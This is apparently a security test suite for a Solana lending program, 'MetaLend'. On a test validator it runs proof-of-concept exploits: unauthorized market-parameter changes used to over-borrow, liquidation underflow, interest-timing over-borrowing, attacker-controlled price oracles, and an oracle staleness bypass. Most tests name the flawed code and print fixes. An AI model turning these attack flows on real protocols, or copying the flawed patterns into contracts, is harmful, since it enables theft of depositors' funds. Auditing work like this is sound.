import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { MetaLend } from "../target/types/meta_lend";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createMint,
  createAccount,
  mintTo,
  getAccount,
} from "@solana/spl-token";
const { expect } = require("chai");

// ============================================
// SECURITY VULNERABILITY EXPLOIT TESTS
// ============================================

describe("SECURITY EXPLOITS", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.MetaLend as Program<MetaLend>;
  const provider = anchor.getProvider();

  let admin: Keypair;
  let attacker: Keypair;
  let victim: Keypair;
  let liquidator: Keypair;

  let usdcMint: PublicKey;
  let ethMint: PublicKey;

  let attackerUsdcAccount: PublicKey;
  let attackerEthAccount: PublicKey;
  let victimUsdcAccount: PublicKey;
  let victimEthAccount: PublicKey;

  let protocolState: PublicKey;
  let market: PublicKey;
  let supplyVault: PublicKey;
  let collateralVault: PublicKey;
  let attackerDeposit: PublicKey;
  let victimDeposit: PublicKey;

  let usdcOracle: PublicKey;
  let ethOracle: PublicKey;

  before(async () => {
    console.log("\nðŸ”´ SECURITY EXPLOIT TEST SUITE ðŸ”´\n");

    admin = Keypair.generate();
    attacker = Keypair.generate();
    victim = Keypair.generate();
    liquidator = Keypair.generate();

    // Airdrop SOL
    for (const keypair of [admin, attacker, victim, liquidator]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(
          keypair.publicKey,
          10 * anchor.web3.LAMPORTS_PER_SOL
        )
      );
    }

    usdcMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      6
    );
    ethMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      9
    );

    attackerUsdcAccount = await createAccount(
      provider.connection,
      attacker,
      usdcMint,
      attacker.publicKey
    );
    attackerEthAccount = await createAccount(
      provider.connection,
      attacker,
      ethMint,
      attacker.publicKey
    );
    victimUsdcAccount = await createAccount(
      provider.connection,
      victim,
      usdcMint,
      victim.publicKey
    );
    victimEthAccount = await createAccount(
      provider.connection,
      victim,
      ethMint,
      victim.publicKey
    );

    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      attackerUsdcAccount,
      admin,
      10000 * 1e6
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      attackerEthAccount,
      admin,
      100 * 1e9
    );
    await mintTo(
      provider.connection,
      admin,
      usdcMint,
      victimUsdcAccount,
      admin,
      60000 * 1e6
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      victimEthAccount,
      admin,
      100 * 1e9
    );

    [protocolState] = PublicKey.findProgramAddressSync(
      [Buffer.from("protocol")],
      program.programId
    );
    [market] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("market"),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [supplyVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("supply_vault"),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
      ],
      program.programId
    );
    [collateralVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("collateral_vault"),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [attackerDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        attacker.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [victimDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        victim.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );
    [usdcOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), usdcMint.toBuffer()],
      program.programId
    );
    [ethOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), ethMint.toBuffer()],
      program.programId
    );

    try {
      await program.account.protocolState.fetch(protocolState);
    } catch {
      await program.methods
        .initializeProtocol()
        .accounts({
          protocolState,
          admin: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();
    }

    try {
      await program.account.oracle.fetch(usdcOracle);
      await program.account.oracle.fetch(ethOracle);
    } catch {
      await program.methods
        .createOracle(Buffer.from("test"), new anchor.BN(1_000_000), 6)
        .accounts({
          oracle: usdcOracle,
          mint: usdcMint,
          authority: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();
      await program.methods
        .createOracle(Buffer.from("test"), new anchor.BN(3000_000_000), 6)
        .accounts({
          oracle: ethOracle,
          mint: ethMint,
          authority: admin.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([admin])
        .rpc();
    }

    await program.methods
      .createMarket(new anchor.BN(2), new anchor.BN(8000), new anchor.BN(8500))
      .accounts({
        market,
        protocolState,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        supplyOracle: usdcOracle,
        collateralOracle: ethOracle,
        supplyVault,
        collateralVault,
        creator: admin.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: attackerDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: victimDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: victim.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    await program.methods
      .supply(new anchor.BN(2), new anchor.BN(50000 * 1e6))
      .accounts({
        market,
        supplyVault,
        userDeposit: victimDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: victimUsdcAccount,
        user: victim.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    console.log("Test environment ready\n");
  });

  // ============================================
  // EXPLOIT #2: Missing Market Admin Check
  // ============================================
  it("EXPLOIT #2: Unauthorized Market Parameter Modification", async () => {
    console.log("EXPLOIT #2: Missing Market Admin Authorization");
    console.log("Location: src/instructions/market_admin.rs:5-18");
    console.log("Severity: CRITICAL\n");

    const marketBefore = await program.account.market.fetch(market);
    console.log("Initial State:");
    console.log(
      `  Collateral Factor: ${marketBefore.collateralFactor} (${
        marketBefore.collateralFactor / 100
      }%)`
    );
    console.log(
      `  Market Admin: ${marketBefore.marketAdmin.toString().slice(0, 8)}...`
    );
    console.log(`  Attacker: ${attacker.publicKey.toString().slice(0, 8)}...`);
    console.log(
      `  Attacker IS Admin: ${marketBefore.marketAdmin.equals(
        attacker.publicKey
      )}\n`
    );

    console.log("ATTACK: Non-admin modifies parameters");

    await program.methods
      .updateMarketParams(new anchor.BN(10000), new anchor.BN(100))
      .accounts({ market, authority: attacker.publicKey })
      .signers([attacker])
      .rpc();

    const marketAfter = await program.account.market.fetch(market);
    console.log("\nAfter Attack:");
    console.log(
      `  Collateral Factor: ${marketAfter.collateralFactor} (${
        marketAfter.collateralFactor / 100
      }%)`
    );

    console.log("\nIMPACT: Borrow 100% of collateral value");

    const collateralAmount = 1 * 1e9; // 1 ETH
    const borrowAmount = 2999 * 1e6; // $2999

    const attackerBalanceBefore = await getAccount(
      provider.connection,
      attackerUsdcAccount
    );

    await program.methods
      .borrow(
        new anchor.BN(2),
        new anchor.BN(collateralAmount),
        new anchor.BN(borrowAmount)
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: attackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: attackerUsdcAccount,
        userCollateralAccount: attackerEthAccount,
        user: attacker.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();

    const attackerBalanceAfter = await getAccount(
      provider.connection,
      attackerUsdcAccount
    );
    const stolen =
      Number(attackerBalanceAfter.amount) -
      Number(attackerBalanceBefore.amount);

    console.log(`  Borrowed: $${stolen / 1e6}`);
    console.log(`  Normal Limit (80%): $2400`);
    console.log(`  Extra Profit: $${stolen / 1e6 - 2400}\n`);

    expect(marketAfter.collateralFactor.toNumber()).to.equal(10000);
    expect(stolen).to.be.greaterThan(2400 * 1e6);
  });

  // ============================================
  // EXPLOIT #3: Liquidation Unchecked Arithmetic
  // ============================================
  it("EXPLOIT #3: Liquidation Integer Underflow", async () => {
    console.log("EXPLOIT #3: Liquidation Unchecked Arithmetic");
    console.log("Location: src/instructions/liquidate.rs:86-87");
    console.log("Severity: CRITICAL\n");

    console.log("VULNERABILITY: Uses unchecked subtraction (-=)");
    console.log("  borrower_deposit.borrowed_amount -= liquidation_amount;\n");

    const setupBorrowAmount = 100 * 1e6;

    await program.methods
      .updateOraclePrice(new anchor.BN(1000_000_000))
      .accounts({ oracle: ethOracle, authority: admin.publicKey })
      .signers([admin])
      .rpc();

    const depositBefore = await program.account.userDeposit.fetch(
      attackerDeposit
    );
    console.log("Borrower State:");
    console.log(
      `  Borrowed: ${depositBefore.borrowedAmount.toNumber() / 1e6} USDC\n`
    );

    console.log(
      "ATTACK: Liquidate MORE than borrowed (race condition scenario)"
    );
    const excessiveLiquidation = 5000 * 1e6;

    try {
      await program.methods
        .liquidate(new anchor.BN(2), new anchor.BN(excessiveLiquidation))
        .accounts({
          market,
          supplyVault,
          collateralVault,
          supplyMint: usdcMint,
          collateralMint: ethMint,
          borrowerDeposit: attackerDeposit,
          liquidatorSupplyAccount: victimUsdcAccount,
          liquidatorCollateralAccount: victimEthAccount,
          liquidator: victim.publicKey,
          oracle: ethOracle,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([victim])
        .rpc();

      const depositAfter = await program.account.userDeposit.fetch(
        attackerDeposit
      );
      console.log(
        `\nBorrowed After: ${depositAfter.borrowedAmount.toString()}`
      );

      if (depositAfter.borrowedAmount.toString().length > 15) {
        console.log("INTEGER UNDERFLOW DETECTED!");
      }
    } catch (error) {
      console.log("Failed as expected (require! check worked)");
    }

    console.log(
      "\nFIX: Use checked_sub().ok_or(LendingError::MathOverflow)?\n"
    );
  });

  // ============================================
  // EXPLOIT #4: Interest Timing
  // ============================================
  it("EXPLOIT #4: Borrow Beyond Limit via Interest Timing", async () => {
    console.log("EXPLOIT #4: Interest Application Timing");
    console.log("Location: src/instructions/borrow.rs:86-101, 63-74");
    console.log("Severity: CRITICAL\n");

    console.log("VULNERABILITY:");
    console.log("  1. Collateralization check at line 63-74");
    console.log("  2. Interest applied AFTER at line 86-101\n");

    const timingAttacker = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        timingAttacker.publicKey,
        5 * anchor.web3.LAMPORTS_PER_SOL
      )
    );

    const timingAttackerUsdc = await createAccount(
      provider.connection,
      timingAttacker,
      usdcMint,
      timingAttacker.publicKey
    );
    const timingAttackerEth = await createAccount(
      provider.connection,
      timingAttacker,
      ethMint,
      timingAttacker.publicKey
    );
    await mintTo(
      provider.connection,
      admin,
      ethMint,
      timingAttackerEth,
      admin,
      10 * 1e9
    );

    const [timingAttackerDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        timingAttacker.publicKey.toBuffer(),
        new anchor.BN(2).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer(),
      ],
      program.programId
    );

    await program.methods
      .initializeUserDeposit(new anchor.BN(2))
      .accounts({
        userDeposit: timingAttackerDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: timingAttacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([timingAttacker])
      .rpc();

    await program.methods
      .updateOraclePrice(new anchor.BN(3000_000_000))
      .accounts({ oracle: ethOracle, authority: admin.publicKey })
      .signers([admin])
      .rpc();

    console.log("Step 1: Initial borrow at max (80% of $3000 = $2400)");
    const collateral = 1 * 1e9;
    const maxBorrow = 2400 * 1e6;

    await program.methods
      .borrow(
        new anchor.BN(2),
        new anchor.BN(collateral),
        new anchor.BN(maxBorrow)
      )
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: timingAttackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: timingAttackerUsdc,
        userCollateralAccount: timingAttackerEth,
        user: timingAttacker.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([timingAttacker])
      .rpc();

    let deposit = await program.account.userDeposit.fetch(
      timingAttackerDeposit
    );
    console.log(`  Borrowed: $${deposit.borrowedAmount.toNumber() / 1e6}\n`);

    console.log("Step 2: Time passes, interest accrues...");
    await provider.connection.getLatestBlockhash();
    await new Promise((resolve) => setTimeout(resolve, 1000));

    console.log("\nStep 3: EXPLOIT - Borrow more without collateral");
    const additionalBorrow = 50 * 1e6;

    try {
      await program.methods
        .borrow(
          new anchor.BN(2),
          new anchor.BN(0),
          new anchor.BN(additionalBorrow)
        )
        .accounts({
          market,
          supplyVault,
          collateralVault,
          userDeposit: timingAttackerDeposit,
          supplyMint: usdcMint,
          collateralMint: ethMint,
          userSupplyAccount: timingAttackerUsdc,
          userCollateralAccount: timingAttackerEth,
          user: timingAttacker.publicKey,
          collateralOracle: ethOracle,
          borrowOracle: usdcOracle,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([timingAttacker])
        .rpc();

      deposit = await program.account.userDeposit.fetch(timingAttackerDeposit);
      console.log("\nEXPLOIT SUCCESS!");
      console.log(
        `  Total Borrowed: $${deposit.borrowedAmount.toNumber() / 1e6}`
      );
      console.log(`  Max Allowed: $2400`);
      console.log(
        `  Excess: $${deposit.borrowedAmount.toNumber() / 1e6 - 2400}\n`
      );
    } catch (error) {
      console.log("Failed (timing dependent)\n");
    }
  });

  // ============================================
  // EXPLOIT #6: Malicious Oracle
  // ============================================
  it("EXPLOIT #6: Price Manipulation via Malicious Oracle", async () => {
    console.log("EXPLOIT #6: Malicious Oracle Creation");
    console.log("Location: src/instructions/oracle.rs:5-23");
    console.log("Severity: HIGH\n");

    console.log("VULNERABILITY: Anyone can create oracle with any authority\n");

    const maliciousMint = await createMint(
      provider.connection,
      attacker,
      attacker.publicKey,
      attacker.publicKey,
      9
    );
    const [maliciousOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), maliciousMint.toBuffer()],
      program.programId
    );

    console.log("Step 1: Create oracle with inflated price");
    const fakePriceInflated = new anchor.BN(1_000_000_000_000);

    await program.methods
      .createOracle(Buffer.from("fake"), fakePriceInflated, 6)
      .accounts({
        oracle: maliciousOracle,
        mint: maliciousMint,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const oracleAccount = await program.account.oracle.fetch(maliciousOracle);
    console.log(`  Price: $${oracleAccount.price.toNumber() / 1e6}`);
    console.log(`  Authority: Attacker [YES]\n`);

    console.log("Step 2: Create market with malicious oracle");

    const [maliciousMarket] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("market"),
        new anchor.BN(99).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        maliciousMint.toBuffer(),
      ],
      program.programId
    );
    const [maliciousSupplyVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("supply_vault"),
        new anchor.BN(99).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
      ],
      program.programId
    );
    const [maliciousCollateralVault] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("collateral_vault"),
        new anchor.BN(99).toArrayLike(Buffer, "le", 8),
        maliciousMint.toBuffer(),
      ],
      program.programId
    );

    await program.methods
      .createMarket(new anchor.BN(99), new anchor.BN(8000), new anchor.BN(8500))
      .accounts({
        market: maliciousMarket,
        protocolState,
        supplyMint: usdcMint,
        collateralMint: maliciousMint,
        supplyOracle: usdcOracle,
        collateralOracle: maliciousOracle,
        supplyVault: maliciousSupplyVault,
        collateralVault: maliciousCollateralVault,
        creator: attacker.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    console.log("  Market created [SUCCESS]\n");

    console.log("IMPACT:");
    console.log("  - Attacker controls price via updateOraclePrice");
    console.log("  - Can drain protocol through price manipulation\n");
  });

  // ============================================
  // EXPLOIT #7: Liquidation Overflow
  // ============================================
  it("EXPLOIT #7: Liquidation Bonus Overflow", async () => {
    console.log("EXPLOIT #7: Liquidation Bonus Overflow");
    console.log("Location: src/instructions/liquidate.rs:42-43");
    console.log("Severity: HIGH\n");

    console.log("VULNERABILITY:");
    console.log(
      "  let collateral_to_seize = liquidation_amount * 1100 / 1000;\n"
    );

    console.log("Overflow Analysis:");
    console.log("  u64::MAX / 1100 = 16,769,548,906,489,146");
    console.log("  Above this, multiplication overflows\n");

    const testAmounts = [
      { amount: 1000n, desc: "1000 (safe)" },
      { amount: 16_769_548_906_489_146n, desc: "At threshold" },
      { amount: 20_000_000_000_000_000n, desc: "Overflows" },
    ];

    for (const test of testAmounts) {
      const result = (test.amount * 1100n) / 1000n;
      const bonus = result - test.amount;
      const expectedBonus = test.amount / 10n;

      console.log(`Amount: ${test.desc}`);
      console.log(`  Expected bonus (10%): ${expectedBonus.toString()}`);
      console.log(`  Calculated bonus: ${bonus.toString()}`);

      if (bonus < expectedBonus / 10n) {
        console.log(`  OVERFLOW: Bonus < 1% instead of 10%`);
      } else {
        console.log(`  No overflow`);
      }
      console.log();
    }

    console.log("FIX: Use u128 checked arithmetic\n");
  });

  // ============================================
  // EXPLOIT #8: Oracle Staleness
  // ============================================
  it("EXPLOIT #8: Oracle Staleness Bypass", async () => {
    console.log("EXPLOIT #8: Oracle Staleness Bypass");
    console.log("Location: src/utils.rs:105-107");
    console.log("Severity: HIGH\n");

    console.log("VULNERABILITY in is_valid():");
    console.log("  current_slot <= self.valid_slot + max_staleness");
    console.log("  Accepts future timestamps!\n");

    const futureMint = await createMint(
      provider.connection,
      attacker,
      attacker.publicKey,
      attacker.publicKey,
      9
    );
    const [futureOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), futureMint.toBuffer()],
      program.programId
    );

    console.log("ATTACK: Create oracle with future valid_slot");

    const inflatedPrice = new anchor.BN(10_000_000_000);
    await program.methods
      .createOracle(Buffer.from("stale"), inflatedPrice, 6)
      .accounts({
        oracle: futureOracle,
        mint: futureMint,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();

    const currentSlot = await provider.connection.getSlot();
    const oracleData = await program.account.oracle.fetch(futureOracle);

    console.log(`  Current slot: ${currentSlot}`);
    console.log(`  Oracle valid_slot: ${oracleData.validSlot.toString()}`);
    console.log(`  Price: $${oracleData.price.toNumber() / 1e6}\n`);

    console.log("IMPACT:");
    console.log("  - Stale prices used if valid_slot set to future");
    console.log("  - Price manipulation via outdated data\n");

    console.log("FIX: Reject future timestamps");
    console.log("  if self.valid_slot > current_slot { return false; }\n");
  });

  // ============================================
  // SUMMARY
  // ============================================
  it("EXPLOIT SUMMARY", async () => {
    console.log("\n" + "=".repeat(60));
    console.log("SECURITY VULNERABILITY SUMMARY");
    console.log("=".repeat(60) + "\n");

    console.log("DEMONSTRATED EXPLOITS:\n");

    console.log("#2: Missing Market Admin Check (CRITICAL)");
    console.log("    â†’ Anyone can modify parameters\n");

    console.log("#3: Liquidation Unchecked Arithmetic (CRITICAL)");
    console.log("    â†’ Integer underflow corrupts accounting\n");

    console.log("#4: Interest Timing Exploit (CRITICAL)");
    console.log("    â†’ Borrow beyond safe limits\n");

    console.log("#6: Malicious Oracle Creation (HIGH)");
    console.log("    â†’ Attacker controls prices\n");

    console.log("#7: Liquidation Bonus Overflow (HIGH)");
    console.log("    â†’ Large liquidations fail\n");

    console.log("#8: Oracle Staleness Bypass (HIGH)");
    console.log("    â†’ Stale prices accepted\n");

    console.log("NOT DEMONSTRATED:");
    console.log(
      "  #1: Flash loan unsafe transmute (requires malicious program)"
    );
    console.log("  #5: Flash loan reentrancy (multi-program attack)");
    console.log("  #9: Withdraw gaps (architectural)");
    console.log("  #10: Rent exemption (edge case)\n");

    console.log("=".repeat(60));
    console.log("WARNING: DO NOT DEPLOY TO MAINNET");
    console.log("=".repeat(60) + "\n");
  });
});
